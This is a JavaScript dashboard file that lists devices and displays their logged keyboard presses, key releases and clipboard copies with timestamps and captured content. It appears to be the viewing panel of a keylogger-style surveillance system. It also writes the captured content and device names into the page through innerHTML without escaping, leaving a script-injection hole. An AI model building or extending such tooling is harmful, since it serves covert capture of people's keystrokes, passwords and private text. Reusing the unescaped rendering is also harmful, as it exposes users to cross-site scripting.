import { getDeviceList, getDeviceLogs } from './get_data.js';

async function renderDeviceList() {
  const deviceListElement = document.getElementById('deviceList');
  deviceListElement.innerHTML = '<h2>设备列表</h2>';

  const devices = await getDeviceList();

  devices.forEach(device => {
    const deviceElement = document.createElement('div');
    deviceElement.className = 'device-item';
    deviceElement.textContent = device.device_name;
    deviceElement.onclick = (e) => showDeviceInfo(device.device_id, device.device_name, e);
    deviceListElement.appendChild(deviceElement);
  });

  const deviceInfoElement = document.getElementById('deviceInfo');
  deviceInfoElement.innerHTML = `
    <div class="empty-state">
      <h2>← 请选择设备查看详细信息</h2>
    </div>
  `;
}

async function showDeviceInfo(deviceId, deviceName, e) {
  document.querySelectorAll('.device-item').forEach(item => {
    item.classList.remove('active');
  });
  e.target.classList.add('active');

  const navbar = document.getElementById('navbar');
  navbar.classList.add('collapsed');

  const deviceInfoElement = document.getElementById('deviceInfo');
  const events = await getDeviceLogs(deviceId);

  const eventTypeMap = {
    'keyboard_press': '按下',
    'keyboard_release': '松开',
    'clipboard_copy': '复制'
  };

  let html = `
    <div class="device-header">
      <h2>${deviceName} - ${deviceId}</h2>
      <div class="divider"></div>
    </div>
    <div class="device-content">
  `;

  if (events.length === 0) {
    html += '<p>暂无事件记录</p>';
  } else {
    events.forEach(event => {
      const date = new Date(event.time * 1000);
      const eventTypeCN = eventTypeMap[event.event_type] || event.event_type;
      html += `
        <div class="event-item">
          <span class="event-time">${date.toLocaleString()} (${event.timezone})</span>
          <span class="event-type">${eventTypeCN}</span>
          <span class="event-content">${event.content}</span>
        </div>
      `;
    });
  }

  html += '</div>';

  deviceInfoElement.innerHTML = html;
}

function initializeNavbar() {
  const navbar = document.getElementById('navbar');
  const toggleBtn = document.getElementById('toggleBtn');

  toggleBtn.addEventListener('click', () => {
    navbar.classList.toggle('collapsed');
  });
}

window.onload = function () {
  renderDeviceList();
  initializeNavbar();
}; 